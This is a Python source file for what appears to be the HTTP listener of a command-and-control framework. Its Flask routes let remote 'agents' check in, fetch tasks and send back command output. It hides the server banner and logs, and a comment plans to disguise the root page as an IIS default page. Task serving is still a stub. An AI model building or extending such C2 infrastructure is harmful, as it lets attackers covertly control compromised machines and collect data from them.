from lib.helpers.output import get_random_string, success
import flask, logging, sys
import threading

cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None
app = flask.Flask(__name__)

class HttpListener:    
    def __init__(self, name, ip, port):
        self.name       = name
        self.port       = port
        self.ipaddress  = ip

    @app.route('/')
    def default():
        return "<h2>Default Page</h2>" # TODO: return IIS default page

    @app.route("/reg", methods=['POST'])
    def __register_agent():
        """
        Register a new agent for this listener
        """
        name     = get_random_string(8)
        remoteip = flask.request.remote_addr
        hostname = flask.request.form.get("name")

        success(f"Agent {name} checked in", newline=True)
        
        return (name, 200)


    @app.route("/results/<name>", methods=['POST'])
    def __receive_result(name):
        """
        Receive results from an agent
        """
        result = flask.request.form.get("result")

        print(f"\n{result.strip()}")

        return ('', 204)


    @app.route("/tasks/<name>", methods=['GET'])
    def __serve_tasks(name):
        """
        Returns an agents tasks
        """
        task = "" # TODO: read tasks
        return (task, 200)


    def __run(self):
        log = logging.getLogger('werkzeug')
        log.level = logging.ERROR
        app.run(port=self.port, host=self.ipaddress)

    def run_as_daemon(self):
        """
        Starts the listener in seperate a thread
        """
        t = threading.Thread(target = self.__run)
        t.start() 
